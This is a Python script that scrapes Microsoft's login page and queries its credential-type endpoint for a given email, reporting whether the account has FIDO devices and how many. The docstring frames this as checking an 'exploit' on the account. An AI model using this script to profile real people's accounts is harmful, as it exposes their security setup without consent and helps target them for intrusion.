import json

from requests_html import HTMLSession

DEFAULT_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ' \
                     'Chrome/114.0.0.0 Safari/537.36'


def check_exploit(email: str) -> dict[str: bool | int | None]:
    """
    :param email: The email address to check for the exploit on
    :return: A dictionary containing the status of the exploit
    and the amount of devices that it's active on

    Checks the status of the exploit on a Microsoft account,
    and if there are multiple FIDO devices enabled on it.
    """
    
    session = HTMLSession()
    session.headers['User-Agent'] = DEFAULT_USER_AGENT

    response = session.get('https://login.live.com/login.srf?')

    data = response.text

    flow_token = data.split('id="i0327" value="')[1].split('"')[0]
    ua_id = data.split('https://login.live.com/Me.htm?v=3&uaid=')[1].split('\'')[0]
    ca_url = data.split('CA:\'')[1].split('\'')[0]

    response = session.post(ca_url, data=json.dumps({
        'username': email,
        'checkPhones': False,
        'federationFlags': 3,
        'flowToken': flow_token,
        'forceotclogin': False,
        'isCookieBannerShown': False,
        'isExternalFederationDisallowed': False,
        'isFidoSupported': True,
        'isOtherIdpSupported': False,
        'isRemoteNGCSupported': True,
        'isSignup': False,
        'otclogindisallowed': False,
        'uaid': ua_id
    }), headers={
        'Accept': 'application/json',
        'Client-Request-Id': ua_id,
        'Content-Type': 'application/json; charset=UTF-8',
        'Origin': 'https://login.live.com',
        'Referer': 'https://login.live.com/login.srf?'
    })

    # Microsoft may change their authentication flow. If the content type is not
    # JSON, then the flow has updated, and this code needs to be updated to use
    # the most recent GetCredentialType URL

    if response.headers['Content-Type'] != 'application/json':
        return {
            'active': None,
            'devices': -1
        }

    data = response.json()

    return {
        'active': bool('Credentials' in data and data['Credentials']['HasFido']),
        'devices': len(data['Credentials']['FidoParams']['AllowList']) if 'Credentials' in data and
                                                                          'FidoParams' in data['Credentials'] else 0
    }
